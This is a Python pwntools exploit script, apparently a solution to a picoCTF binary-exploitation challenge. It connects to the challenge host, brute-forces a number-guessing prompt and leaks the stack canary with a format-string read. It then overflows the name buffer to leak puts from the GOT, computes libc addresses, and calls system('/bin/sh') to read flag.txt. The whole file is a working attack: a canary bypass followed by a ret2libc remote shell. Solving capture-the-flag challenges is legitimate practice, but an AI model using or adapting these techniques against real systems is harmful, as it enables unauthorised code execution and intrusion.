import pwn
from ctypes import CDLL
#from struct import pack

host = "jupiter.challenges.picoctf.org"
port = 13775
target = "./vuln" # https://jupiter.challenges.picoctf.org/static/119f0f0370aa220585b906b2e4a8f98b/vuln

def must_guess(pr):
    for i in range(-4096, 4096, 1):
        if i == 0: continue
        pr.sendlineafter("What number would you like to guess?\n", str(i))
        res = pr.readline()
        if 'Nope' not in res.decode():
            print(i, res)
            break
    return i

def test_canary(pr):
    num = None
    for i in range(2, 200):
        if num is None:
            num = must_guess(pr)
        else:
            pr.sendlineafter("What number would you like to guess?\n", str(num))
        pr.readline()
        pr.sendlineafter("New winner!\nName? ", 'XXX %{}$lx'.format(i))
        print(i, pr.readline())

def find_canary(pr, num):
    pr.sendlineafter("What number would you like to guess?\n", str(num))
    pr.sendlineafter("New winner!\nName? ", '%{}$lx'.format(119))
    return int(pr.readline().decode().split(':')[1].strip(), 16)

def find_symbol(pr, canary, num):
    elf = pwn.ELF(target, False)
    payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
    payload += pwn.p32(elf.plt['puts'])
    payload += pwn.p32(elf.sym['win'])
    payload += pwn.p32(elf.got['puts'])
    pr.sendlineafter("What number would you like to guess?\n", str(num))
    pr.sendlineafter("New winner!\nName? ", payload)
    pr.readline()
    pr.readline()
    return pwn.u32(pr.readline()[:4])

def get_shell(pr, canary, sys_addr, binsh_addr):
    elf = pwn.ELF(target, False)
    payload = b'A' * 512 + pwn.p32(canary) + b'B'*12
    payload += pwn.p32(sys_addr)
    payload += pwn.p32(elf.sym['win'])
    payload += pwn.p32(binsh_addr)
    """the rop way
    rop = pwn.ROP(elf)
    rop.call(sys_addr, [binsh_addr])
    payload += rop.chain()
    """
    print('payload:', payload)
    pr.sendafter("New winner!\nName? ", payload)
    pr.sendline()
    print(pr.readline())
    print(pr.readline())
    pr.sendline("cat flag.txt;")
    print('flag:', pr.readall(timeout=2).decode())
    #pr.interactive()

def attack(remote):
    pr = None
    if remote:
        pr = pwn.remote(host, port)
    else:
        pr = pwn.process(target)

    try:
        """find canary"""
        num = must_guess(pr)
        canary = find_canary(pr, num)
        print('canary:', hex(canary))
         
        """find address of puts, call puts to print the address of itself"""
        puts_addr = find_symbol(pr, canary, num)
        print('puts @', hex(puts_addr))

        """get shell"""
        # symbol address from https://libc.blukat.me/d/libc6-i386_2.27-3ubuntu1.2_amd64.symbols
        libc_base = puts_addr - 0x673d0
        sys_addr = libc_base + 0x3cd80
        binsh_addr = libc_base + 0x17bb8f
        print('sys @', hex(sys_addr), 'binsh @', hex(binsh_addr))
        get_shell(pr, canary, sys_addr, binsh_addr)

    except Exception as e:
        print(e)
    finally:
        pr.close()

attack(True)
